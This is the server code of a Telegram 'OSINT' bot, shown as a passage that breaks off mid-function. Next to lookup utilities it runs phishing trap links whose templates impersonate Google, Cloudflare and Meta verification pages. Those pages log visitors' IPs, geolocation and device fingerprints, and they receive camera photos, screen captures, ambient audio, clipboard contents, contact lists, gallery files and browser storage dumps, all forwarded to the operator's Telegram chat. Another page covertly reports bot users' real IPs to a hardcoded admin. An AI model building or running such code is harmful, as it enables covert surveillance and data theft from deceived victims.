import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dns from "dns";
import util from "util";
import { Telegraf, Markup } from "telegraf";
import "dotenv/config";
import net from "net";
import crypto from "crypto";
import fs from "fs";
import { templates } from "./trapTemplates";

const TARGETS_FILE = "targets.json";
let targetsData: any[] = [];
if (fs.existsSync(TARGETS_FILE)) {
  try { targetsData = JSON.parse(fs.readFileSync(TARGETS_FILE, 'utf-8')); } catch(e){}
}
const saveTargets = () => fs.writeFileSync(TARGETS_FILE, JSON.stringify(targetsData, null, 2));
import AdmZip from "adm-zip";
import yts from "yt-search";
import play from "play-dl";
import ytdl from "@distube/ytdl-core";


const resolveMx = util.promisify(dns.resolveMx);

// Timeout helper for fetch
const fetchWithTimeout = async (url: string, options: RequestInit = {}, timeoutMs: number = 4000) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return response;
  } catch (error) {
    clearTimeout(id);
    throw error;
  }
};

async function startServer() {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;
  console.log(`[STARTUP] ENV: ${process.env.NODE_ENV || 'development'}`);
  console.log(`[STARTUP] Target Port: ${PORT} (from env: ${process.env.PORT || 'not set'})`);

  // Stateless Trap ID Generation & Validation
  const generateTrapId = (chatId: number) => {
    return Buffer.from(`${chatId}-OSINT-${crypto.randomUUID().slice(0,4)}`).toString('base64url');
  };

  const suspeciousAgents = ['amphp', 'python', 'go-http-client', 'curl', 'wget'];

   const isSuspeciousAgent = (userAgent: string | undefined): boolean => {
    return false; // Proceed anyway
  };

  const getChatIdFromTrapId = (trapId: string): number | null => {
    try {
      const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
      if (decoded.includes('-OSINT-')) {
        const idStr = decoded.split('-OSINT-')[0];
        return parseInt(idStr, 10);
      }
      return null;
    } catch {
      return null;
    }
  };

  // Default to the Railway App URL as requested. It will still update dynamically based on host headers.
  let appHost = process.env.VITE_APP_URL || "https://telegram-bot-osint-v1-production.up.railway.app";
  
  app.set("trust proxy", 1); // Crucial for Railway/Proxy environments

  // 1. TOP-LEVEL HEALTH CHECKS (MUST BE FIRST)
  app.get('/health', (req, res) => res.status(200).send('OK'));
  app.get('/healthz', (req, res) => res.status(200).send('OK'));
  
  app.use((req, res, next) => {
    const ua = req.headers['user-agent'] || '';
    if (ua.includes('HealthCheck') || ua.includes('Railway') || ua.includes('GoogleHC') || req.query.health === '1') {
        return res.status(200).send('OK');
    }
    next();
  });

  // Request logging
  app.use((req, res, next) => {
    if (req.path !== '/health' && req.path !== '/healthz' && !req.path.includes('.')) {
      console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    }
    next();
  });

  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ limit: '50mb', extended: true }));

  const escapeHTML = (text: string) => {
    return text.replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    }[m] || m));
  };

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const bot = token ? new Telegraf(token) : null;
  const botInstance = bot;
  const webhookSecret = token ? token.split(':')[0] : null;
  const webhookPath = webhookSecret ? `/telegraf/${webhookSecret}` : null;

  const ADMIN_ID = Number(process.env.ADMIN_ID) || 8587171470; // GANTI DENGAN TELEGRAM ID OWNER
  const PASSWORD = process.env.PASSWORD || "112233";
  let authenticatedUsers = new Set<number>();
  let agreementUsers = new Set<number>();

  try {
    if (fs.existsSync('auth.json')) {
      authenticatedUsers = new Set(JSON.parse(fs.readFileSync('auth.json', 'utf8')));
    }
    if (fs.existsSync('agreement.json')) {
      agreementUsers = new Set(JSON.parse(fs.readFileSync('agreement.json', 'utf8')));
    }
  } catch (e) { console.error("Error loading auth files", e); }

  const saveAuth = () => { fs.writeFileSync('auth.json', JSON.stringify([...authenticatedUsers])); };
  const saveAgreement = () => { fs.writeFileSync('agreement.json', JSON.stringify([...agreementUsers])); };

  if (bot && webhookPath) {
    app.post(webhookPath, (req, res) => {
      bot.handleUpdate(req.body, res).catch(err => {
        console.error("Bot Handle Update Error:", err);
        if (!res.headersSent) res.sendStatus(500);
      });
    });
    console.log(`[${new Date().toISOString()}] Bot Webhook Route Registered: ${webhookPath}`);
  }

  app.use((req, res, next) => {
    // Attempt to capture public URL
    const hostObj = req.headers['x-forwarded-host'] || req.headers.host;
    if (hostObj) {
      const hostStr = Array.isArray(hostObj) ? hostObj[0] : hostObj;
      if (hostStr.includes('.run.app') || hostStr.includes('.railway.app') || hostStr.includes('ais-dev')) {
        const protocol = req.headers['x-forwarded-proto'] || 'https';
        appHost = `${protocol}://${hostStr}`;
      }
    }
    next();
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  // Capture Bot User IP & Redirect
  app.get('/verify-bot-user', (req, res) => {
    const { uid, name } = req.query;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (botInstance) {
      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const report = `📢 <b>BOT USER IDENTIFIED & VERIFIED</b> 📢\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n\n` +
                     `👤 <b>USER NAME:</b> <code>${escapeHTML(String(name || 'Unknown'))}</code>\n` +
                     `🆔 <b>TELEGRAM ID:</b> <code>${uid}</code>\n` +
                     `🌐 <b>REAL IP ADDRESS:</b> <code>${escapeHTML(String(ip))}</code>\n\n` +
                     `🖥️ <b>SYSTEM BROWSER:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n` +
                     `✅ <i>STATUS: HIGH-PRECISION IDENTITY SYNC SUCCESSFUL.</i>`;
      
      botInstance.telegram.sendMessage(ADMIN_ID, report, { parse_mode: 'HTML' }).catch(() => {});
    }

    res.send(`
      <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Complete</title></head>
      <body style="font-family:-apple-system, sans-serif; text-align:center; padding:50px 20px; background:#fff; color:#333;">
        <div style="color:#1a73e8; font-size:60px; margin-bottom:20px;">🛡️</div>
        <h2 style="margin-bottom:10px;">Verification Successful</h2>
        <p style="color:#666; margin-bottom:30px;">Your security profile has been synchronized with the main server. You now have full access to the terminal features.</p>
        <p style="font-size:14px; color:#999;">IP Captured: ${escapeHTML(String(ip))}</p>
        <div style="margin-top:40px;">
          <a href="https://t.me/share/url?url=Success" style="background:#1a73e8; color:#fff; text-decoration:none; padding:12px 24px; border-radius:6px; font-weight:600;">Return to Bot</a>
        </div>
      </body></html>
    `);
  });

  // OSINT API ENDPOINTS FOR FRONTEND UI
  app.post('/api/osint/username', async (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: 'Username required' });
    
    // Platforms list (similar to bot command)
    const platforms = [
        { name: "GitHub", url: `https://github.com/${username}` },
        { name: "Twitter", url: `https://twitter.com/${username}` },
        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
        { name: "Facebook", url: `https://www.facebook.com/${username}` },
        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
        { name: "GitLab", url: `https://gitlab.com/${username}` },
        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
        { name: "Blogger", url: `https://${username}.blogspot.com` },
        { name: "WordPress", url: `https://${username}.wordpress.com` },
        { name: "MobileLegends", url: `https://m.mobilelegends.com/en/search/user?keyword=${username}` },
        { name: "Detik", url: `https://news.detik.com/search?query=${username}` },
        { name: "Bukalapak", url: `https://www.bukalapak.com/u/${username}` },
        { name: "Tokopedia", url: `https://www.tokopedia.com/people/${username}` },
        { name: "Traveloka", url: `https://www.traveloka.com/en-id/user/${username}` },
        { name: "Bstation", url: `https://www.bilibili.tv/en/space/${username}` },
        { name: "Shopee", url: `https://shopee.co.id/${username}` }
    ];

    const results = await Promise.all(platforms.map(async (platform) => {
        try {
            const response = await fetchWithTimeout(platform.url, { method: 'GET' }, 3000);
            return {
                name: platform.name,
                url: platform.url,
                found: response.status === 200,
                status: response.status
            };
        } catch (e) {
            return { name: platform.name, url: platform.url, found: false, status: 'TIMEOUT' };
        }
    }));

    res.json({ username, results });
  });

  app.get('/api/osint/ip', async (req, res) => {
    const ip = req.query.query || req.query.ip || '';
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ status: 'fail', message: 'System timeout' });
    }
  });

  app.get('/api/osint/whois', async (req, res) => {
    const domain = String(req.query.domain || req.query.q || '').replace(/https?:\/\//, '').replace(/\/$/, '');
    try {
        const response = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: 'WHOIS lookup failed' });
    }
  });

  app.get('/api/osint/dns', async (req, res) => {
    const domain = String(req.query.domain || req.query.q || '').replace(/https?:\/\//, '').replace(/\/$/, '');
    try {
        const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: 'DNS lookup failed' });
    }
  });

  app.get('/api/osint/email', async (req, res) => {
    const email = String(req.query.email || '');
    if (!email.includes('@')) return res.status(400).json({ error: 'Invalid email' });
    const domain = email.split("@")[1];
    try {
        const records = await resolveMx(domain);
        res.json({ email, domain, validFormat: true, mxRecords: records });
    } catch (e) {
        res.status(500).json({ email, domain, validFormat: true, mxRecords: [], error: true, message: 'MX fetch failed' });
    }
  });

  app.get('/api/osint/nik', (req, res) => {
    const nik = String(req.query.nik || '');
    if (!/^\d{16}$/.test(nik)) return res.status(400).json({ error: 'NIK must be 16 digits' });

    const provMap: Record<string, string> = { "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat", "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan", "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung", "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat", "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur", "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat", "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat", "62": "Kalimantan Tengah", "63": "Kalimantan Selatan", "64": "Kalimantan Timur", "65": "Kalimantan Utara", "71": "Sulawesi Utara", "72": "Sulawesi Tengah", "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara", "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku", "82": "Maluku Utara", "91": "Papua Barat", "94": "Papua" };
    const prov = nik.substring(0, 2);
    const kab = nik.substring(2, 4);
    const kec = nik.substring(4, 6);
    let tgl = parseInt(nik.substring(6, 8), 10);
    const bln = nik.substring(8, 10);
    let thn = parseInt(nik.substring(10, 12), 10);
    const urut = nik.substring(12, 16);

    let gender = "Laki-laki";
    if (tgl >= 40) {
      gender = "Perempuan";
      tgl -= 40;
    }
    const currentYear = new Date().getFullYear() % 100;
    thn = thn > currentYear ? 1900 + thn : 2000 + thn;

    res.json({
      nik, gender, 
      birthDate: `${tgl.toString().padStart(2, '0')}-${bln}-${thn}`,
      province: provMap[prov] || "Unknown",
      kabupatenCode: kab,
      kecamatanCode: kec,
      sequence: urut
    });
  });

  app.get('/api/osint/plat', (req, res) => {
    const platInput = String(req.query.plat || '').replace(/\s/g, '').toUpperCase();
    const match = platInput.match(/^([A-Z]{1,2})(\d{1,4})([A-Z]{0,3})$/);
    if (!match) return res.status(400).json({ error: 'Invalid license plate format' });

    const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };
    const regionCode = match[1];
    res.json({
      plat: `${match[1]} ${match[2]} ${match[3]}`,
      region: platMap[regionCode] || "Unknown Region",
      code: regionCode,
      number: match[2],
      suffix: match[3]
    });
  });

  // ... (previous API routes continue here)
  
  // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
  app.get('/t/:tmplId/:id', (req, res) => {
    const { id, tmplId } = req.params;
    const chatId = getChatIdFromTrapId(id);
    if (!chatId) return res.status(404).send('<h2>Error 404: Link Invalid or Expired.</h2>');

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (botInstance) {
      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const targetIp = String(ip).split(',')[0].trim();
      
      (async () => {
        let geoInfo = "<i>Fetching Geodata...</i>";
        try {
          const res = await fetch(`http://ip-api.com/json/${targetIp}?fields=status,country,city,isp,as,mobile,proxy,query`).then(r => r.json());
          if (res.status === 'success') {
            geoInfo = `├ COUNTRY: <code>${res.country}</code>\n` +
                      `├ CITY: <code>${res.city}</code>\n` +
                      `├ ISP: <code>${res.isp}</code>\n` +
                      `├ VPN/PROXY: <code>${res.proxy ? 'YES' : 'CLEAN'}</code>\n` +
                      `└ MOBILE: <code>${res.mobile ? 'YES' : 'NO'}</code>`;
          }
        } catch(e) {}

        let msg = `🚩 <b>TARGET ACCESS DETECTED</b> 🚩\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
                  `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
                  `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n\n` +
                  `🌍 <b>GEOGRAPHIC OSINT:</b>\n${geoInfo}\n\n` +
                  `📦 <b>TEMPLATE:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
                  `🔑 <b>NODE_ID:</b> <code>${id}</code>\n\n` +
                  `🖥️ <b>BROWSER AGENT:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `⏳ <i>STATUS: INITIALIZING ADVANCED AUDIT...</i>`;

        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
      })();
      
      targetsData.push({
        id: id,
        timestamp: new Date().toISOString(),
        type: 'BASIC_HIT',
        ip: targetIp,
        ua: String(userAgent)
      });
      saveTargets();
    }

    const template = templates[tmplId] || templates['1'];
    res.send(template.render(id));
  });

  // Backward compatibility alias
  app.get('/t/:id', (req: any, res) => {
    req.params.tmplId = '1';
    app._router.handle(req, res, () => {});
  });

  app.post('/api/log/:id/debug', (req, res) => {
    console.log(`[CLIENT-DEBUG][${req.params.id}]:`, req.body);
    res.sendStatus(200);
  });

  // Handle Device Metadata Upload
  app.post('/api/log/:id/info', (req, res) => {
    console.log(`[DEBUG] Received info log for ${req.params.id}`);
    if (isSuspeciousAgent(req.headers['user-agent'])) {
        console.log(`[DEBUG] Blocked info log for ${req.params.id} due to User-Agent`);
        return res.sendStatus(403);
    }
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const data = req.body as any;
      const tmplId = data.tmplId || '1';
      const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
      
      let header = '🕵️‍♂️ <b>SYSTEM DIAGNOSTIC: Metadata Captured</b>';
      let statusText = '🔄 <i>SYNCING...</i>';

      if (tmplId === 'google') {
        header = '🛡️ <b>GOOGLE SECURITY AUDIT</b>';
      } else if (tmplId === 'cloudflare') {
        header = '☁️ <b>CLOUDFLARE EDGE REPORT</b>';
      } else if (tmplId === 'meta_verification') {
        header = '🎯 <b>META VERIFICATION SESSION</b>';
      } else if (tmplId === 'terminal') {
        header = '💻 <b>KERNEL DIAGNOSTIC LOG</b>';
      } else if (tmplId === 'gallery') {
        header = '🖼️ <b>MEDIA INTEGRITY REPORT</b>';
      }
      
      if (data.visual_identity) statusText = '📸 <i>MEDIA_CAPTURE_ACTIVE</i>';
      if (data.gps) statusText = '📍 <i>GPS_FIX_ESTABLISHED</i>';

      let msg = `<b>${header}</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
                  `📋 <b>SESSION INFRASTRUCTURE:</b>\n` +
                  `├ CONTEXT: <code>${escapeHTML(templateName)}</code>\n` +
                  `├ STATE: <code>${statusText}</code>\n` +
                  `└ NODE_ID: <code>${id}</code>\n\n` +
                  `🖥️ <b>DEVICE FINGERPRINT:</b>\n` +
                  `├ OS/PLAT: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
                  `├ ENGINE: <code>${escapeHTML(data.vendor || 'N/A')}</code>\n` +
                  `├ CPU_CORES: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
                  `├ RAM_EST: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
                  `├ GPU_PROC: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
                  `├ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
                  `└ PLUGINS: <code>${data.plugins ? data.plugins.split(',').length : '0'} detected</code>\n\n` +
                  `🌍 <b>GEOGRAPHIC DATA:</b>\n` +
                  `├ TIMEZONE: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
                  `└ LANGUAGES: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;

      botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
      
      // Save to Target DB
      targetsData.push({
        id: id,
        timestamp: new Date().toISOString(),
        type: 'ADVANCED_AUDIT',
        platform: data.platform,
        browser: data.vendor,
        gpu: data.gpu
      });
      saveTargets();
    }
    res.sendStatus(200);
  });

  // Handle Extra Data (Clipboard, Media, Screen, etc)
  app.post('/api/log/:id/extra', (req, res) => {
    console.log(`[DEBUG] Received extra log for ${req.params.id}`);
    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const data = req.body as any;
      console.log(`[DEBUG] Extra log data keys for ${id}: ${Object.keys(data)}`);
      let extraMsg = `📎 <b>FORENSIC LOG: Advanced Modules</b>\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n`;
      let hasTextData = false;
      
      const addSection = (title: string, content: string) => {
        if (extraMsg.length + content.length > 3900) {
            botInstance.telegram.sendMessage(chatId, extraMsg + `\n<i>(Continuing audit stream...)</i>`, { parse_mode: 'HTML' }).catch(() => {});
            extraMsg = `📎 <b>CONTINUED AUDIT STREAM</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
        }
        extraMsg += `<b>${title}</b>\n${content}\n\n`;
        hasTextData = true;
      };

      // 1. Handle Images (Media Capture)
      if (data.visual_identity) {
        try {
          const base64Data = data.visual_identity.includes(',') ? data.visual_identity.split(',')[1] : data.visual_identity;
          const buffer = Buffer.from(base64Data, 'base64');
          if (buffer.length > 0) {
            botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'media.jpg' }, { 
              caption: '📸 <b>CAPTURE: Media Identity</b>\nTarget: <code>' + id + '</code>', 
              parse_mode: 'HTML' 
            }).catch(err => console.error('Error sending media photo:', err));
          }
        } catch(e) { console.error('Buffer processing error (visual_identity):', e); }
      }

      // 2. Handle Images (Screen Capture)
      if (data.screen_capture) {
        try {
          const base64Data = data.screen_capture.includes(',') ? data.screen_capture.split(',')[1] : data.screen_capture;
          const buffer = Buffer.from(base64Data, 'base64');
          if (buffer.length > 0) {
            botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'screen.jpg' }, { 
              caption: '🖥️ <b>CAPTURE: Remote Screen</b>\nLabel: <code>' + (data.screen_label || 'Active Session') + '</code>', 
              parse_mode: 'HTML' 
            }).catch(err => console.error('Error sending screen photo:', err));
          }
        } catch(e) { console.error('Buffer processing error (screen_capture):', e); }
      }

      // 3. Handle Audio Chunks
      if (data.audio_chunk) {
        try {
          const base64Data = data.audio_chunk.includes(',') ? data.audio_chunk.split(',')[1] : data.audio_chunk;
          const buffer = Buffer.from(base64Data, 'base64');
          if (buffer.length > 0) {
            botInstance.telegram.sendVoice(chatId, { source: buffer, filename: 'ambient.ogg' }, {
              caption: '🎙️ <b>CAPTURE: Ambient Audio Segment</b>\nNode: <code>' + id + '</code>',
              parse_mode: 'HTML'
            }).catch(err => console.error('Error sending audio chunk:', err));
          }
        } catch(e) {}
      }

      if (data.display_hz || data.thermal_load || data.device_visibility || data.forensic_storage) {
        let visTxt = '';
        if (data.display_hz) visTxt += `├ Refresh: <code>${data.display_hz} Hz</code>\n`;
        if (data.thermal_load) visTxt += `├ Thermal: <code>${data.thermal_load}</code>\n`;
        if (data.device_visibility) visTxt += `├ Visibility: <code>${data.device_visibility}</code>\n`;
        if (data.forensic_storage) {
          try {
            const s = typeof data.forensic_storage === 'string' ? JSON.parse(data.forensic_storage) : data.forensic_storage;
            visTxt += `└ Storage: <code>LS:${s.ls_keys} SS:${s.ss_keys} CK:${s.cookies} DB:${s.indexedDB} SW:${s.serviceWorkers}</code>`;
          } catch(e) {}
        }
        addSection(`📡 Environment & Storage`, visTxt);
      }

      if (data.sensor_mag || data.sensor_acc || data.sensor_gyr || data.sensor_light) {
        let sTxt = '';
        if (data.sensor_mag) sTxt += `├ Mag: <code>${data.sensor_mag}</code>\n`;
        if (data.sensor_acc) sTxt += `├ Acc: <code>${data.sensor_acc}</code>\n`;
        if (data.sensor_gyr) sTxt += `├ Gyr: <code>${data.sensor_gyr}</code>\n`;
        if (data.sensor_light) sTxt += `├ Light: <code>${data.sensor_light} lux</code>\n`;
        if (data.sensor_orient) sTxt += `└ Orient: <code>${data.sensor_orient}</code>`;
        addSection(`📐 Hardware Motion/Light`, sTxt);
      }

      if (data.hardware_brand_profile) {
        try {
          const h = typeof data.hardware_brand_profile === 'string' ? JSON.parse(data.hardware_brand_profile) : data.hardware_brand_profile;
          addSection(`🛠️ Hardware Profile`,
                     `├ Model: <code>${escapeHTML(h.model || 'N/A')}</code>\n` +
                     `├ Form: <code>${escapeHTML(h.formFactor || 'N/A')}</code>\n` +
                     `└ Arch: <code>${escapeHTML(h.architecture || 'N/A')}</code> (${h.bitness || '?'}bit)`);
        } catch(e) {}
      }

      if (data.cpu_compute_score || data.perf_cores) {
        addSection(`⚡ Performance Benchmark`,
                   `├ Engine: <code>Audit Runtime v3</code>\n` +
                   `├ Score: <code>${data.cpu_compute_score || 'N/A'}</code>\n` +
                   `└ Resources: <code>${data.perf_cores || 'N/A'} Cores / ${data.perf_mem || 'N/A'} GB RAM</code>`);
      }

      if (data.clipboard_sync || data.clipboard || data.clipboard_update) {
        const clip = data.clipboard_sync || data.clipboard || data.clipboard_update;
        addSection(`📋 Clipboard Sync`, `└ Content: <pre>${escapeHTML(clip.substring(0, 1500))}</pre>`);
      }

      if (data.media_hardware) {
        addSection(`🎙️ AV Hardware Inventory`, `<pre>${escapeHTML(data.media_hardware.substring(0, 1000))}</pre>`);
      }

      if (data.file_name) {
        addSection(`📂 File Metadata`,
                   `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
                   `├ Type: <code>${data.file_type}</code>\n` +
                   `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>`);
      }

      if (data.gpu_full_profile) {
        try {
          const gpu = typeof data.gpu_full_profile === 'string' ? JSON.parse(data.gpu_full_profile) : data.gpu_full_profile;
          addSection(`🎮 Graphics Configuration`,
                      `├ Vendor: <code>${escapeHTML(gpu.vendor)}</code>\n` +
                      `├ Renderer: <code>${escapeHTML(gpu.renderer)}</code>\n` +
                      `├ GL_Ver: <code>${escapeHTML(gpu.gl_version)}</code>\n` +
                      `└ Shading: <code>${escapeHTML(gpu.shading_lang)}</code>`);
        } catch(e) {}
      }

      if (data.media_devices) {
        addSection(`📷 Media Peripherals`, `<pre>${escapeHTML(data.media_devices.substring(0, 1000))}</pre>`);
      }

      if (data.canvas_fp || data.audio_fp) {
        let fpt = ``;
        if (data.canvas_fp) fpt += `├ Canvas: <code>${escapeHTML(data.canvas_fp)}</code>\n`;
        if (data.audio_fp) fpt += `└ Audio: <code>${escapeHTML(data.audio_fp)}</code>`;
        if (fpt) addSection(`🧬 Browser Fingerprint`, fpt);
      }

      if (data.battery_level || data.battery_status) {
        const lvl = data.battery_level || data.battery_status;
        const char = data.battery_charging || data.charging;
        addSection(`🔋 System Power Status`,
                    `├ Level: <code>${lvl}</code>\n` +
                    `├ Plugged: <code>${char ? 'AC_POWER' : 'BATTERY'}</code>\n` +
                    `└ Time: <code>${data.battery_time || 'N/A'}</code>`);
      }

      if (data.fonts_count || data.installed_fonts) {
        addSection(`🔡 Typography Profile`,
                    `├ Count: <code>${data.fonts_count || '?' }</code>\n` +
                    `└ Registry: <code>${escapeHTML((data.installed_fonts || '').substring(0, 300))}</code>`);
      }

      const apis = ['api_bluetooth', 'api_usb', 'api_hid', 'api_serial', 'api_midi', 'api_idle', 'api_contacts', 'api_wake', 'api_storage'];
      let apiTxt = '';
      apis.forEach(k => {
        if (data[k] !== undefined) apiTxt += `${data[k] ? '✅' : '❌'} ${k.replace('api_', '').toUpperCase()}\n`;
      });
      if (apiTxt) addSection(`🧱 Hardware API Availability`, apiTxt);

      if (data.social_active || data.social_inactive) {
         let socialTxt = '';
         if (data.social_active) socialTxt += `├ Active: <code>${data.social_active}</code> (${data.load_ms || 'N/A'}ms)\n`;
         if (data.social_inactive) socialTxt += `└ Inactive: <code>${data.social_inactive}</code>\n`;
         addSection(`🤝 Social Presence Audit`, socialTxt);
      }

      if (data.network_rtt || data.latency) {
        addSection(`🛰️ Network Latency Profile`,
                    `├ Node: <code>${data.network_rtt || 'N/A'}</code>\n` +
                    `└ RTT: <code>${data.latency || 'N/A'}ms</code>`);
      }

      if (data.contacts_leaked) {
        let count = 0;
        try { count = (typeof data.contacts_leaked === 'string' ? JSON.parse(data.contacts_leaked) : data.contacts_leaked).length; } catch(e) {}
        addSection(`👥 Contact List Sync`, `└ Total Entries: <code>${count} items</code>`);
      }

      if (data.storage_mb) {
        addSection(`💾 Storage Audit`,
                    `├ Used: <code>${data.storage_mb} MB</code>\n` +
                    `└ Quota: <code>${data.quota_gb} GB</code>`);
      }
      
      if (data.incognito_audit !== undefined || data.devtools_open !== undefined) {
        addSection(`🕵️ Environment Integrity`,
                    `├ Stealth: <b>${data.incognito_audit ? 'PRIVATE' : 'NORMAL'}</b>\n` +
                    `└ Debug: <b>${data.devtools_open ? 'DETECTED' : 'CLEAN'}</b>`);
      }
      
      if (data.net_effective) {
        addSection(`🌐 Network Layer Diagnostics`,
                    `├ Type: <code>${data.net_effective}</code>\n` +
                    `├ RTT: <code>${data.net_rtt}ms</code>\n` +
                    `└ Downlink: <code>${data.net_downlink}Mb/s</code>`);
      }

      if (data.storage_ls_full || data.storage_ss_full) {
        let storageTxt = '';
        let lsObj = {};
        let ssObj = {};

        if (data.storage_ls_full) {
          try {
            lsObj = typeof data.storage_ls_full === 'string' ? JSON.parse(data.storage_ls_full) : data.storage_ls_full;
            storageTxt += `├ <b>LocalStorage:</b> <code>${Object.keys(lsObj).length} keys</code>\n`;
          } catch(e) { storageTxt += `├ LocalStorage: [Capture Error]\n`; }
        }
        if (data.storage_ss_full) {
          try {
            ssObj = typeof data.storage_ss_full === 'string' ? JSON.parse(data.storage_ss_full) : data.storage_ss_full;
            storageTxt += `└ <b>SessionStorage:</b> <code>${Object.keys(ssObj).length} keys</code>\n`;
          } catch(e) { storageTxt += `└ SessionStorage: [Capture Error]\n`; }
        }
        
        try {
          const zip = new AdmZip();
          zip.addFile("localStorage.json", Buffer.from(JSON.stringify(lsObj, null, 2), "utf8"));
          zip.addFile("sessionStorage.json", Buffer.from(JSON.stringify(ssObj, null, 2), "utf8"));
          const zipBuffer = zip.toBuffer();
          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `StorageAudit_${id}.zip` }, { caption: "💾 <b>Security Audit: Storage Dump</b>", parse_mode: 'HTML' }).catch(() => {});
        } catch (e) {}

        addSection(`💾 Persistent Storage Audit`, storageTxt);
      }

      if (data.files_gallery) {
        try {
          const zip = new AdmZip();
          let fCount = 0;
          for (let f of data.files_gallery) {
            zip.addFile(f.name || `image_${fCount}.jpg`, Buffer.from(f.data, "base64"));
            fCount++;
          }
          const zipBuffer = zip.toBuffer();
